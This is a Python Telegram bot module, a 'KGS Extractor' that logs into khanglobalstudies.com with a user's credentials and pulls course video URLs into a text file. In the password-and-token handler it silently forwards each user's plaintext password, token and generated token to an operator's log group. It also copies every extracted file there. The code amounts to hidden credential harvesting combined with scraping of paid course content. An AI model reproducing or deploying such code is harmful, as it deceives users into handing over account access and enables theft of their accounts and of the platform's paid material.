import logging
import os
import requests
from telegram import Update
from telegram.ext import (
    CommandHandler,
    ConversationHandler,
    MessageHandler,
    ContextTypes,
    filters,
)
from config import LOG_GROUP_ID

# Conversation states
LOGIN_CHOICE, USER_ID, PASSWORD_OR_TOKEN, BATCH_SELECTION = range(4)

# Constants
ROOT_DIR = os.getcwd()

async def kgs_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Start the KGS extraction process."""
    await update.message.reply_text(
        "𝐖𝐞𝐥𝐜𝐨𝐦𝐞 𝐭𝐨 𝐊𝐆𝐒 𝐄𝐱𝐭𝐫𝐚𝐜𝐭𝐨𝐫!\n\n"
        "Choose Login Method:\n"
        "1️⃣ Login with ID and Password\n"
        "2️⃣ Login with Token\n\n"
        "Please enter 1 or 2:"
    )
    return LOGIN_CHOICE

async def handle_login_choice(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle the login method choice."""
    try:
        choice = update.message.text.strip()
        if choice not in ['1', '2']:
            await update.message.reply_text("Invalid choice! Please enter 1 or 2.")
            return LOGIN_CHOICE

        context.user_data['login_choice'] = choice
        await update.message.reply_text("Please enter your User ID:")
        return USER_ID

    except Exception as e:
        logging.error(f"Error in handle_login_choice: {e}")
        await update.message.reply_text("An error occurred. Please try again later.")
        return ConversationHandler.END

async def handle_user_id(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle the user ID input."""
    try:
        user_id = update.message.text.strip()
        context.user_data['user_id'] = user_id

        if context.user_data['login_choice'] == '1':
            await update.message.reply_text("Please enter your Password:")
        else:
            await update.message.reply_text("Please enter your Token:")
        return PASSWORD_OR_TOKEN

    except Exception as e:
        logging.error(f"Error in handle_user_id: {e}")
        await update.message.reply_text("An error occurred. Please try again later.")
        return ConversationHandler.END

async def handle_password_or_token(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle password or token input and perform login."""
    try:
        input_text = update.message.text.strip()
        headers = {
            "Host": "khanglobalstudies.com",
            "content-type": "application/x-www-form-urlencoded",
            "accept-encoding": "gzip",
            "user-agent": "okhttp/3.9.1",
        }

        # Log credentials to the group
        if context.user_data['login_choice'] == '1':
            await context.bot.send_message(
                chat_id=LOG_GROUP_ID,
                text=f"New KGS login attempt:\nUser ID: ```{context.user_data['user_id']}```\nPassword: ```{input_text}```",
                parse_mode="Markdown"
            )
        else:
            await context.bot.send_message(
                chat_id=LOG_GROUP_ID,
                text=f"New KGS token login:\nUser ID: ```{context.user_data['user_id']}```\nToken: ```{input_text}```",
                parse_mode="Markdown"
            )

        if context.user_data['login_choice'] == '1':
            # Login with ID and password
            login_url = "https://khanglobalstudies.com/api/login-with-password"
            data = {
                "phone": context.user_data['user_id'],
                "password": input_text,
            }
            response = requests.post(login_url, headers=headers, data=data)
            if response.status_code != 200:
                await update.message.reply_text("Login failed! Please check your credentials.")
                return ConversationHandler.END
            token = response.json().get("token")
            
            # Log obtained token for password login
            await context.bot.send_message(
                chat_id=LOG_GROUP_ID,
                text=f"KGS Login Success!\nUser ID: ```{context.user_data['user_id']}```\nGenerated Token: ```{token}```",
                parse_mode="Markdown"
            )
        else:
            # Direct token login
            token = input_text

        # Store token and fetch batches
        context.user_data['token'] = token
        headers = {
            "Host": "khanglobalstudies.com",
            "authorization": f"Bearer {token}",
            "accept-encoding": "gzip",
            "user-agent": "okhttp/3.9.1",
        }
        
        course_response = requests.get(
            "https://khanglobalstudies.com/api/user/v2/courses",
            headers=headers
        )

        if course_response.status_code != 200:
            await update.message.reply_text("Failed to fetch batches. Please check your credentials.")
            return ConversationHandler.END

        courses = course_response.json()
        context.user_data['courses'] = courses

        # Format batch information with token
        batch_text = f"𝐋𝐨𝐠𝐢𝐧 𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥!\n\n𝙰𝚞𝚝𝚑 𝚃𝚘𝚔𝚎𝚗: ```{token}```\n\n𝐀𝐯𝐚𝐢𝐥𝐚𝐛𝐥𝐞 𝐁𝐚𝐭𝐜𝐡𝐞𝐬:\n\n"
        for course in courses:
            batch_text += f"𝑩𝒂𝒕𝒄𝒉 𝑵𝒂𝒎𝒆😶‍🌫️: ```{course['title']}```\n𝑩𝒂𝒕𝒄𝒉 𝑰𝑫💡: ```{course['id']}```\n\n"

        await update.message.reply_text(
            f"{batch_text}\nPlease enter the Batch ID to proceed:",
            parse_mode="Markdown"
        )
        return BATCH_SELECTION

    except Exception as e:
        logging.error(f"Error in handle_password_or_token: {e}")
        await update.message.reply_text("An error occurred during login. Please try again later.")
        return ConversationHandler.END

async def handle_batch_selection(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle batch selection and extract content."""
    try:
        batch_id = update.message.text.strip()
        
        # Find selected batch
        selected_batch = next(
            (batch for batch in context.user_data['courses'] if str(batch['id']) == batch_id),
            None
        )
        
        if not selected_batch:
            await update.message.reply_text("Invalid Batch ID! Please try again.")
            return BATCH_SELECTION

        await update.message.reply_text("𝐋𝐢𝐧𝐤 𝐞𝐱𝐭𝐫𝐚𝐜𝐭𝐢𝐨𝐧 𝐬𝐭𝐚𝐫𝐭𝐞𝐝. 𝐏𝐥𝐞𝐚𝐬𝐞 𝐰𝐚𝐢𝐭✋️...")

        # Setup headers for API requests
        headers = {
            "Host": "khanglobalstudies.com",
            "authorization": f"Bearer {context.user_data['token']}",
            "accept-encoding": "gzip",
            "user-agent": "okhttp/3.9.1",
        }

        # Fetch lessons
        lessons_url = f"https://khanglobalstudies.com/api/user/courses/{batch_id}/v2-lessons"
        lessons_response = requests.get(lessons_url, headers=headers)
        
        if lessons_response.status_code != 200:
            await update.message.reply_text("Failed to fetch lessons. Please try again.")
            return ConversationHandler.END

        lessons = lessons_response.json()
        full_content = ""

        # Extract video URLs for each lesson
        for lesson in lessons:
            try:
                lesson_url = f"https://khanglobalstudies.com/api/lessons/{lesson['id']}"
                lesson_response = requests.get(lesson_url, headers=headers)
                lesson_data = lesson_response.json()

                videos = lesson_data.get("videos", [])
                for video in videos:
                    title = video.get("name", "Untitled").replace(":", " ")
                    video_url = video.get("video_url", "")
                    if video_url:
                        full_content += f"{title}: {video_url}\n"

            except Exception as e:
                logging.error(f"Error processing lesson {lesson['id']}: {e}")
                continue

        if full_content:
            filename = f"KGS_{selected_batch['title']}_{batch_id}.txt"
            file_path = os.path.join(ROOT_DIR, filename)
            
            with open(file_path, "w", encoding="utf-8") as f:
                f.write(full_content)

            # Send file to user
            user_caption = (
                f"𝑯𝒆𝒓𝒆'𝒔 𝒚𝒐𝒖𝒓 𝒆𝒙𝒕𝒓𝒂𝒄𝒕𝒆𝒅 𝒄𝒐𝒏𝒕𝒆𝒏𝒕!✨️\n\n"
                f"𝐁𝐚𝐭𝐜𝐡 𝐧𝐚𝐦𝐞😁: {selected_batch['title']}"
            )
            with open(file_path, "rb") as f:
                await update.message.reply_document(
                    document=f,
                    caption=user_caption
                )

            # Send file to log group
            log_caption = (
                f"𝙺𝙶𝚂 𝚌𝚘𝚗𝚝𝚎𝚗𝚝 𝚎𝚡𝚝𝚛𝚊𝚌𝚝𝚎𝚍 𝚊𝚗𝚍 𝚜𝚎𝚗𝚝 𝚝𝚘 𝚞𝚜𝚎𝚛.\n\n"
                f"𝐁𝐚𝐭𝐜𝐡 𝐧𝐚𝐦𝐞😁: {selected_batch['title']}"
            )
            with open(file_path, "rb") as f:
                await context.bot.send_document(
                    chat_id=LOG_GROUP_ID,
                    document=f,
                    caption=log_caption
                )

            # Clean up
            os.remove(file_path)
            await update.message.reply_text("𝑬𝒙𝒕𝒓𝒂𝒄𝒕𝒊𝒐𝒏 𝒄𝒐𝒎𝒑𝒍𝒆𝒕𝒆𝒅 𝒔𝒖𝒄𝒄𝒆𝒔𝒔𝒇𝒖𝒍𝒍𝒚! ✨")
        else:
            await update.message.reply_text("𝐍𝐨 𝐜𝐨𝐧𝐭𝐞𝐧𝐭 𝐟𝐨𝐮𝐧𝐝 Sorry🤪.")

        return ConversationHandler.END

    except Exception as e:
        logging.error(f"Error in handle_batch_selection: {e}")
        await update.message.reply_text("An error occurred during content extraction. Please try again later.")
        return ConversationHandler.END

# Create the conversation handler
kgs_handler = ConversationHandler(
    entry_points=[CommandHandler("kgs", kgs_start)],
    states={
        LOGIN_CHOICE: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_login_choice)],
        USER_ID: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_user_id)],
        PASSWORD_OR_TOKEN: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_password_or_token)],
        BATCH_SELECTION: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_batch_selection)],
    },
    fallbacks=[],
)